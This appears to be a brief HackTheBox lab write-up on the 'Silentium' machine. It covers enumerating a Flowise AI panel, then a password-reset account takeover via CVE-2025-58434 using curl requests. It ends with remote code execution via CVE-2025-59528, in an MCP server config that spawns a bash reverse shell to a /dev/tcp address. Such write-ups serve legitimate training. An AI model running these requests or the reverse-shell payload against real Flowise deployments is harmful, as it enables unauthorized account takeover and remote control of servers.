# HackTheBox Silentium Full Chain Penetration Testing

## External Reconnaissance and Service Identification
    Vhost enumeration, revealed `staging.silentium.htb` leading to the `Flowise Ai` login panel
    Vulnerability Assessment: Detection of CVE-2025-58434
    Vaild user identification via web common enumeration
## Exploitation and Initial Access
    `curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password  -H "Content-Type: application/json" -d '{"user": {"email": "ben@silentium.htb"}}'`
    API returned TempToken, used for later unauthorized password reset
    `curl -X POST http://staging.silentium.htb/api/v1/account/reset-password \
    -H "Content-Type: application/json" \
    -d '{
      "user": {
        "email": "ben@silentium.htb",
        "tempToken": "[TOKEN]",
        "password": "Qwerty12345."
      }
    }'
    Identifying panel vulnerability as CVE-2025-59528
    RCE via CustomMCP script resulting in reverse shell
    `{
    "mcpServers": {
        "pwn": {
          "command": "node",
          "args": [
            "-e",
            "require('child_process').exec('bash -c \"bash -i >& /dev/tcp/10.10.15.236/7777 0>&1\"')"
          ]
        }
      }
    }`
